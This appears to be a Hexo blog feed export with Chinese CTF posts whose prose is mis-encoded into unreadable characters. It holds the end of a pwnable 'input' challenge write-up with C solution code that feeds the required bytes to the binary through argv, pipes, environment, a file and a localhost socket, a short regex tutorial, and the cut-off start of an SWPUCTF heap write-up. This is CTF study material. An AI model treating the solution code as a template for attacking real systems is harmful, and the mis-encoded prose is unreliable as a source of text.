class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æºç å¤§æ¦‚æ„æ€å°±æ˜¯ç»™ç¨‹åºäº”ç§è¾“å…¥æ–¹æ³•ï¼Œå¦‚æœç¨‹åºä»æŒ‡å®šæ–¹æ³•è·å¾—äº†å¯¹åº”çš„å€¼é‚£ä¹ˆè¿™ä¸€å…³è¢«åˆ¤æ­£ç¡®å¹¶ä¸”è¿›å…¥ä¸‹ä¸€å…³ï¼Œè¿‡å»äº”å…³å°±èƒ½æ‹¿åˆ°flagã€‚</p><p>ç¬¬ä¸€å…³æ˜¯å‘½ä»¤è¡Œè¾“å…¥ï¼Œè¦æ±‚å‘½ä»¤è¡Œæœ‰100ä¸ªå‚æ•°ï¼Œç„¶åargv[â€˜Aâ€™]=â€\x00â€ï¼Œargv[â€˜Bâ€™]=â€\x20\x0a\x0dâ€ï¼Œé‚£å°±ç»™å‘½ä»¤è¡Œä¸€ç™¾ä¸ªå‚æ•°ï¼Œç„¶åæ»¡è¶³ä¸€ä¸‹å¯¹åº”çš„è¦æ±‚å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç”¨execveå»æ‰§è¡Œè¿™ä¸ªç¨‹åºã€‚ç„¶åç¨‹åºæ„é€ å‘½ä»¤è¡Œçš„å‚æ•°ä¼ ç»™ç¬¬äºŒä¸ªå‚æ•°å°±å¯ä»¥é€šè¿‡ç¬¬ä¸€å…³äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå°±å¯ä»¥å‘ç°ç¬¬ä¸€å…³è¿‡å»äº†ï¼Œè¿™ä¸ªæºç å¯ä»¥æ”¾åœ¨è‡ªå·±ç”µè„‘ç¼–è¯‘ç„¶åæµ‹è¯•å“¦ï¼Œç­‰åˆ°è‡ªå·±èƒ½æ‰“é€šäº†å†å»è€ƒè™‘æœåŠ¡å™¨çš„ç¯å¢ƒã€‚</p><p>ç¬¬äºŒå…³è™½ç„¶æ˜¯stdioï¼Œä½†æ˜¯å®ƒè¿™é‡Œä¸ä»…è¦æ±‚è¯»å–ç‰¹æ®Šå­—èŠ‚ï¼Œè¿˜è¦ä»stderrä¸­è¯»å…¥ç‰¹å®šå­—èŠ‚ã€‚è¿™é‡Œå¡äº†æœ‰ç‚¹ä¹…ï¼Œæœ€åè¿˜æ˜¯googleäº†ä¸€ä¸‹æ‰å¾—åˆ°çš„ä¸€ä¸ªå¥½æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä¹Ÿè´´ä¸€ä¸‹è¿™ä½å¸ˆå‚…è¿™ç¯‡åšå®¢ï¼Œæˆ‘åšè¿™ä¸ªä¹Ÿæ˜¯å‚ç…§è¿™ä½å¸ˆå‚…çš„åšå®¢åšçš„â€“&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/ï¼Œç‰¹æ­¤æ„Ÿè°¢ï¼</a></p><p>è¿™é‡Œå‘¢é€‰æ‹©forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åçˆ¶å­è¿›ç¨‹ç”¨ç®¡é“é€šä¿¡ï¼Œçˆ¶è¿›ç¨‹æŠŠç®¡é“æ¥å£å®šå‘åˆ°stdinå’Œstderråå»æ‰§è¡Œinputã€‚å­è¿›ç¨‹é€šè¿‡ç®¡é“ç»™çˆ¶è¿›ç¨‹å‘é€æ•°æ®ï¼Œç„¶åçˆ¶è¿›ç¨‹å°±èƒ½ä»stdinå’Œstderrä¸­å¾—åˆ°æ•°æ®äº†ã€‚</p><p>ç¬¬ä¸‰å…³ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä»ç¯å¢ƒå˜é‡ä¸­è·å¾—å¯¹åº”æ•°æ®ã€‚ç¯å¢ƒå˜é‡å…¶å®è·Ÿå‘½ä»¤è¡Œå‚æ•°è¾“å…¥å·®ä¸å¤šï¼Œexecveç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ç¯å¢ƒå˜é‡ï¼Œä¼ å…¥ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œç„¶åé‡Œé¢ç»™ä¸€ä¸ªxxx=yyyï¼Œé‚£ä¹ˆå®ƒä»ç¯å¢ƒå˜é‡ä¸­get(xxx)å°±ä¼šè·å¾—yyyã€‚</p><p>ç¬¬å››ä¸ªå°±æ›´ç®€å•äº†ï¼Œå®ƒä»æ–‡ä»¶è¯»ä½ å°±å¯¹åº”å†™ä¸€ä¸ªæ–‡ä»¶ç»™å®ƒå¥½äº†ã€‚</p><p>ç¬¬äº”ä¸ªç¨å¾®æœ‰ç‚¹ä¸œè¥¿ï¼Œæ˜¯å…³äºsocketç¼–ç¨‹çš„ï¼ŒåŸºæœ¬ä¸Šä¹Ÿå¯ä»¥è¶…ï¼Œä½†æ˜¯ä¹Ÿé‡åˆ°è¯¸å¤šé—®é¢˜ï¼Œæˆ‘ä¸€ä¸ªexpå¹¶ä¸èƒ½æ‰“é€šï¼Œæˆ‘è¿è¡Œä¸€ä¸ªexpä¹‹åä¼šè¢«æŒ‚èµ·ï¼Œæˆ‘å†è¿è¡Œä¸€ä¸ªexpæ‰èƒ½è®©ç¬¬ä¸€ä¸ªexp getflagï¼Œç›²çŒœæ˜¯å®ƒæ•°æ®æ²¡æ¥æ”¶åˆ°ï¼Œæˆ‘æµ‹è¯•ä¹‹åå‘ç°sleepä¹Ÿä¸ç®¡ç”¨ï¼Œä½†æ˜¯è¿™ä¸€å…³å·²ç»èƒ½æ‰“è¿‡å»äº†ã€‚</p><p>ä½†æ˜¯ç”±äºpwnableæœåŠ¡å™¨çš„ç‰¹æ®Šæœºåˆ¶ï¼Œæˆ‘ä»¬home ç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼Œæ‰€ä»¥å¾—å»å¯»æ‰¾æˆ‘ä»¬æ–‡ä»¶èƒ½è½åœ°çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯/tmpç›®å½•ï¼Œè¿™é‡Œçš„ç›®å½•æˆ‘ä»¬æœ‰å†™çš„æƒé™ï¼Œä½†æ˜¯æ²¡æœ‰è¯»çš„æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é‡Œé¢æ–°å»ºä¸€ä¸ªè‡ªå·±çš„æ–‡ä»¶å¤¹ï¼Œç„¶åæŠŠinputå¯æ‰§è¡Œæ–‡ä»¶å’Œflagæ–‡ä»¶é“¾æ¥åˆ°è¿™ä¸ªç›®å½•æ¥ï¼Œæœ€åä¸Šä¼ expæ‰§è¡Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> IO </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼çš„ä½¿ç”¨</title>
      <link href="/2021/11/19/Re/"/>
      <url>/2021/11/19/Re/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å’Œæˆ˜é˜Ÿä¸€èµ·çš„æ¯”èµ›ä¸­åˆå‡ºç°äº†è¯¸å¤šæƒ³è¦å­¦ä¹ çš„çŸ¥è¯†ç‚¹ï¼Œé‚£å°±æ˜¯reå’ŒQRcodeï¼Œä»Šå¤©å…ˆå­¦ä¸€ä¸‹è¿™ä¸ªæ­£åˆ™å§ã€‚</p><span id="more"></span><p>é‚£ä¹ˆæˆ‘å·²å¼€å§‹æ¥è§¦æ­£åˆ™å‘¢ï¼Œåº”è¯¥æ˜¯åœ¨å­¦çˆ¬è™«çš„æ—¶å€™ï¼Œå› ä¸ºå½“æ—¶çˆ¬è™«å­¦çš„ä¸å¤ªå¥½ä¹Ÿå°±æ²¡æœ‰æ¥ç€å­¦æ­£åˆ™åŒ¹é…ã€‚åæ¥åœ¨æ¢äº†linuxç³»ç»Ÿä¹‹åç»å¸¸ä¼šç”¨åˆ°ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œé‚£å°±æ˜¯|grepã€‚ä¸å¾—ä¸è¯´è¿™ä¸ªåœ¨æ‰¾ä¸œè¥¿çš„æ—¶å€™çœŸçš„æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œæ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæœ¬æ¬¡å’ŒNepnepæˆ˜é˜Ÿå‚åŠ xctfåˆ†åŒºèµ›ä¹Ÿæ˜¯æœ‰ä¸€é“ä¿®å¤äºŒç»´ç çš„é¢˜ç›®ï¼Œå½“æ—¶å¸ˆå‚…ä»¬å¯èƒ½æœ‰äº›ç‚¹æ²¡æ³¨æ„åˆ°ï¼Œå¯¼è‡´æœ€åä¿®å¤çš„äºŒç»´ç å¤šè¾¾16000çš„æ‰«æç»“æœã€‚</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>å¾—åˆ°ç»“æœä¹‹åæœ¬ä»¥ä¸ºè¦ç»å†æ¼«é•¿çš„äººå·¥è¿‡æ»¤ï¼Œå¯æ˜¯å’±ä»¬æˆ˜é˜Ÿçš„ä¸€ä½çˆ·çˆ·ç›´æ¥solvedï¼Œè€Œè¿™ä½çˆ·çˆ·å°±æ˜¯ç›´æ¥ç”¨äº†æ­£åˆ™åŒ¹é…ã€‚</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h2><p>æ­£åˆ™è¡¨è¾¾å¼ï¼ˆè‹±è¯­ï¼šRegular Expressionï¼Œå¸¸ç®€å†™ä¸ºregexã€regexpæˆ–REï¼‰ï¼Œåˆç§°æ­£åˆ™è¡¨ç¤ºå¼ã€æ­£åˆ™è¡¨ç¤ºæ³•ã€è§„åˆ™è¡¨è¾¾å¼ã€å¸¸è§„è¡¨ç¤ºæ³•ï¼Œæ˜¯è®¡ç®—æœºç§‘å­¦çš„ä¸€ä¸ªæ¦‚å¿µã€‚æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨å•ä¸ªå­—ç¬¦ä¸²æ¥æè¿°ã€åŒ¹é…ä¸€ç³»åˆ—åŒ¹é…æŸä¸ªå¥æ³•è§„åˆ™çš„å­—ç¬¦ä¸²ã€‚åœ¨å¾ˆå¤šæ–‡æœ¬ç¼–è¾‘å™¨é‡Œï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›åŒ¹é…æŸä¸ªæ¨¡å¼çš„æ–‡æœ¬ã€‚</p><p>è®¸å¤šç¨‹åºè®¾è®¡è¯­è¨€éƒ½æ”¯æŒåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œå­—ç¬¦ä¸²æ“ä½œã€‚ä¾‹å¦‚ï¼Œåœ¨Perlä¸­å°±å†…å»ºäº†ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ã€‚æ­£åˆ™è¡¨è¾¾å¼è¿™ä¸ªæ¦‚å¿µæœ€åˆæ˜¯ç”±Unixä¸­çš„å·¥å…·è½¯ä»¶ï¼ˆä¾‹å¦‚sedå’Œgrepï¼‰æ™®åŠå¼€çš„ã€‚</p><p>ä»¥ä¸Šæ¥è‡ªç»´åŸºç™¾ç§‘ã€‚</p><h3 id="è½¬ä¹‰ç¬¦"><a href="#è½¬ä¹‰ç¬¦" class="headerlink" title="è½¬ä¹‰ç¬¦"></a>è½¬ä¹‰ç¬¦</h3><p>å³æ–œæ (\)è€è½¬ä¹‰ç¬¦äº†ï¼Œåœ¨å³æ–œæ ä¹‹åçš„ä¸€ä¸ªå­—å°†ä¼šå¸¦æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œå¦‚æœè¦åŒ¹é…å³æ–œæ åˆ™éœ€è¦åŒå†™ã€‚</p><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><p>é€šé…ç¬¦æˆ‘ä»¬ç†ŸçŸ¥çš„å°±æ˜¯æ˜Ÿå·(*)å’Œé—®å·(?)ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å®ƒä»¬åˆ†åˆ«ä»£è¡¨ä»»æ„å¤šä¸ªå­—ç¬¦æˆ–è€…æ˜¯ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­å­˜åœ¨ä¸‰ç§ç±»ä¼¼çš„ç¬¦å·ï¼Œå¹¶ä¸”ä¸èƒ½åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œåªèƒ½ä»£è¡¨å‰é¢ä¸€ä¸ªå­—ç¬¦çš„æ•°é‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+ï¼šåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br><span class="line">?ï¼šåŒ¹é…ä¸€ä¸ªæˆ–é›¶ä¸ªå­—ç¬¦</span><br><span class="line">*ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚</p><p>â€˜a+â€™å¯ä»¥åŒ¹é…â€™aâ€™,â€™aaâ€™,â€™aaaâ€™,â€™aaaaâ€™â€¦â€¦ç­‰å­—ç¬¦ä¸²ã€‚</p><p>â€˜a?â€™å¯ä»¥åŒ¹é…â€™aâ€™æˆ–è€…ç©ºä¸²</p><p>â€˜a*â€™åˆ™å¯ä»¥åŒ¹é…ç¬¬ä¸€ç§æƒ…å†µå’Œç¬¬äºŒç§æƒ…å†µçš„å¹¶é›†ã€‚</p><h3 id="åŒ¹é…ä»»æ„å­—ç¬¦"><a href="#åŒ¹é…ä»»æ„å­—ç¬¦" class="headerlink" title="åŒ¹é…ä»»æ„å­—ç¬¦"></a>åŒ¹é…ä»»æ„å­—ç¬¦</h3><p>[]æ–¹æ‹¬å·ç”¨äºåŒ¹é…å•ä¸ªå­—ç¬¦ã€‚</p><p>ä¾‹å¦‚</p><p>[abcde]å¯ä»¥åŒ¹é…a,b,c,d,eä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</p><p>å¦‚æœåŠ ä¸Š^åˆ™ä»£è¡¨åŒ¹é…é™¤äº†åˆ—è¡¨ä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ã€‚</p><p>ä¾‹å¦‚</p><p>[^a]è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éâ€™aâ€™çš„å­—ç¬¦ã€‚</p><h3 id="åŒ¹é…æ¬¡æ•°é™å®š"><a href="#åŒ¹é…æ¬¡æ•°é™å®š" class="headerlink" title="åŒ¹é…æ¬¡æ•°é™å®š"></a>åŒ¹é…æ¬¡æ•°é™å®š</h3><p>{}ç”¨äºé™å®šåŒ¹é…æ¬¡æ•°</p><p>ä¾‹å¦‚ï¼š</p><p>[ab]{3}è¡¨ç¤º[ab]åŒ¹é…ä¸‰æ¬¡ï¼Œ[ab]{3,}è¡¨ç¤ºè‡³å°‘åŒ¹é…ä¸‰æ¬¡ã€‚</p><p>å°±å…ˆå­¦è¿™ä¹ˆå¤šå§ï¼Œåç»­å†å­¦å°±å†åŠ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap writeup</title>
      <link href="/2021/11/10/SWPUCTF_2019_p1KkHeap/"/>
      <url>/2021/11/10/SWPUCTF_2019_p1KkHeap/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•â€”<a href="https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap">SWPUCTF_2019_p1KkHeap</a></p><span id="more"></span><p>è¿™æ³¢åˆåˆ·æ–°äº†æˆ‘å¯¹2.27ç‰ˆæœ¬libcçš„è®¤çŸ¥ã€‚é‚£å°±æ˜¯tcache struct ï¼Œè¯ä¸å¤šè¯´çœ‹é¢˜ã€‚</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>64ä½ä¿æŠ¤å…¨å¼€ï¼Œä¹ æƒ¯å°±å¥½ã€‚è½½å…¥IDAæŸ¥çœ‹å‘ç°pltè¡¨æœ‰å¾ˆå¤šå‡½æ•°ï¼Œå…¶ä¸­æœ‰<code>mmap</code>å’Œ<code>prctl</code>ï¼Œ<code>prctl</code>æœ€å¸¸è§çš„å°±æ˜¯è®¾ç½®æ²™ç®±è§„åˆ™ï¼Œ<code>mmap</code>æœ€å¸¸è§çš„å°±æ˜¯ç›´æ¥ç»™ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„ä¸€ç‰‡å†…å­˜åŒºåŸŸï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿”å›ç»ˆç«¯æŸ¥çœ‹ä¸€ä¸‹æ²™ç®±è§„åˆ™ã€‚</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/1.png" alt="1"></p><p>è¿™ä¸ªæœ‰ç‚¹å¤æ‚ï¼Œä¸è¿‡å¤§æ¦‚ç‡å°±å¯ä»¥è®¤ä¸ºä»–ç»™ä½ 